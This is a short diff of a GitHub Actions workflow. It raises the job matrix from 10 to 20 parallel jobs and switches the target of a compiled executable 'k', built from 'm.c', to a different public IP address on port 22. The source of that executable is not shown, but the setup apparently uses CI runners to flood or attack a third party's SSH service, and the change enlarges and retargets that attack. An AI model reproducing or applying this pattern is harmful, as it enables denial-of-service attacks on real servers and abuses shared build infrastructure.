@@ -11,7 +11,7 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        job-number: [1,2,3,4,5,6,7,8,9,10]
+        job-number: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     name: Job ${{ matrix.job-number }}
     steps:
       - name: Checkout repository
@@ -24,4 +24,4 @@ jobs:
         run: gcc -o k m.c -lpthread
 
       - name: Run executable
-        run: ./k 161.123.220.236 22 400 300
+        run: ./k 216.202.200.164 22 400 300
